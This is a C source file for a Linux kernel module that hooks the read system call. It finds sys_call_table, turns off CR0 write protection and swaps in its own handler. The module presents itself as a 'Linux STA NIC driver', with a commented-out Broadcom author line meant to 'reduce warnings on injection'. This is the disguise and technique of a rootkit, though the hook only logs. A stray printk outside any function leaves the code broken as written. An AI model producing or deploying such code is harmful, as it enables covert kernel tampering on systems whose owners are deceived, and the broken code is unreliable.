#include <linux/init.h> //Macros
#include <linux/module.h>
#include <linux/syscalls.h> //Need to grab syscalls
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>


//-- Required to reduce warnings on injection --
//#define DRIVER_AUTHOR "Broadcom Corporation"
//#define DRIVER_DESCRIPTION "Linux STA NIC driver"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Me");
MODULE_DESCRIPTION("Linux STA NIC driver");
MODULE_VERSION("1.0");
//MODULE_SUPPORTED_DEVICE("NIC_Device");

//-----------------------------------------------


unsigned long **SYS_CALL_TABLE; //Points to sys call table





void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000)); //Setting processor flags to disable anti-writng feature

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000); //Setting processor flag to reinable anti-writing feature

} 



asmlinkage int (*original_read)(unsigned int, void __user*, size_t); //Normal read function

//Modified Read function
printk(KERN_INFO "ATTEMPTING READ!!");
asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) { 
	printk(KERN_INFO "READ HOOKED HERE! -- This is our function!"); 
	return (*original_read)(fd, buf, count); //Return to original read
}






static int __init SetHooks(void) {
	// Fetch Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); //Get pointer to funcs

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);


	EnablePageWriting(); //Overwrite desired syscall

    // Replaces Pointer Of Syscall_read on our syscall.
	original_read = (void*)SYS_CALL_TABLE[__NR_read];
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead; //Point to our code
	DisablePageWriting(); //Return to normal mode (pages safe again)

	return 0;
}






//On module unload
static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)original_read;
	DisablePageWriting();

	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);